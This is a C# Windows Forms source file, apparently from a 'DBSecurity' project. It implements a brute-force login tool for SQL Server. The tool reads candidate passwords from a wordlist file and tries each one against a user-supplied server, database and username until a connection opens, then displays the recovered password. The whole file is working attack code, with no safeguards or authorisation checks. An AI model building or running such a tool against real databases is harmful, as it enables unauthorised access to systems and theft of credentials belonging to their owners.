using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data.SqlClient;

namespace DBSecurity
{
    public partial class frmBruteForce : Form
    {
  
        public frmBruteForce()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            string servername = textBox1.Text;
            string username = textBox2.Text;
            string dbname = textBox3.Text;
            string password;
            int i, count;
            int j = 0;
            count = Convert.ToInt32(textBox4.Text);
            System.IO.StreamReader sr = new System.IO.StreamReader("pass.txt");
            for(i=0;i<=count;i++)
            {
                j++;
                password = sr.ReadLine();
                label5.Text = password;
                listBox1.Items.Add(password);
                string co = (i + 1).ToString();
                Update();
                if(j>=15)
                {
                    j = 0;
                    listBox1.Items.Clear();
                }
                try
                {
                    SqlConnection conn = new SqlConnection("server=" + servername + ";database=" + dbname + ";user=" + username + ";pwd=" + password + ";CONNECT TIMEOUT=1;");
                    conn.Open();
                   
                    if(conn.State==ConnectionState.Open)
                    {
                        label6.Text = "Connected, password is: " + password + Environment.NewLine + "count is: "+ co;
                        return;
                    }
                    conn.Close();
                }
                catch
                {
                    label6.Text = "Searching passwords..." +Environment.NewLine + "count is: " + co ;
                }
              
            }
        }
    }
}
